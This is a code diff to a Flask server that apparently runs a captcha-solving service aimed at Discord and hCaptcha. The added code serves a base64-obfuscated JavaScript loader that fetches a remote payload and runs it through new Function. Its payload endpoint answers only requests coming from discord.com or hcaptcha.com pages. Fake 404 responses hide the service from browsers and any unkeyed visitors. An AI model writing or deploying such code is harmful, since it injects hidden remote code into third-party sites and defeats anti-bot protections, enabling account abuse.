@@ -70,12 +70,45 @@ def load_keys():
                 keys.append(k)
     return keys
 @app.route('/nanhne', methods=['GET'])
-def flask_serve_solver_js():
+def flask_serve_loader_js():
     if not is_safe_request(request):
         return Response(fake_404, status=404, mimetype='text/html')
     sec_fetch_dest = request.headers.get('Sec-Fetch-Dest', '')
     if sec_fetch_dest == 'document':
         return Response(fake_404, status=404, mimetype='text/html')
+    user_key = request.args.get('user_key', '').strip()
+    valid_user_keys = load_user_keys()
+    if not user_key or (valid_user_keys and user_key not in valid_user_keys):
+        return Response(fake_404, status=404, mimetype='text/html')
+    payload_url = request.host_url.rstrip('/') + f'/api/payload?user_key={user_key}'
+    loader_script = f"""
+    (async function() {{
+        try {{
+            const req = await fetch('{payload_url}&_t=' + Date.now());
+            if (req.ok) {{
+                const code = await req.text();
+                new Function(code)();
+            }}
+        }} catch(e) {{}}
+    }})();
+    """
+    import base64
+    encoded_loader = base64.b64encode(loader_script.encode('utf-8')).decode('utf-8')
+    final_loader = f"Function(decodeURIComponent(escape(atob('{encoded_loader}'))))();"
+    return Response(final_loader, mimetype='application/javascript')
+@app.route('/api/payload', methods=['GET'])
+def flask_serve_payload_js():
+    if not is_safe_request(request):
+        return Response(fake_404, status=404, mimetype='text/html')
+        
+    origin = request.headers.get('Origin', '')
+    referer = request.headers.get('Referer', '')
+    
+    if origin and 'discord.com' not in origin and 'hcaptcha.com' not in origin:
+        return Response(fake_404, status=404, mimetype='text/html')
+    elif referer and 'discord.com' not in referer and 'hcaptcha.com' not in referer:
+        return Response(fake_404, status=404, mimetype='text/html')
+
     user_key = request.args.get('user_key', '').strip()
     valid_user_keys = load_user_keys()
     if not user_key or (valid_user_keys and user_key not in valid_user_keys):
@@ -302,11 +335,7 @@ def flask_serve_solver_js():
     final_encoded = base64.b64encode(obfuscator_template.encode('utf-8')).decode('utf-8')
     obfuscated_script = f"Function(decodeURIComponent(escape(atob('{final_encoded}'))))();"
     
-    response = Response(obfuscated_script, mimetype='application/javascript')
-    response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
-    response.headers['Pragma'] = 'no-cache'
-    response.headers['Expires'] = '0'
-    return response
+    return Response(obfuscated_script, mimetype='application/javascript')
 
 @app.route('/api/solve', methods=['POST', 'OPTIONS'])
 def solve_captcha():
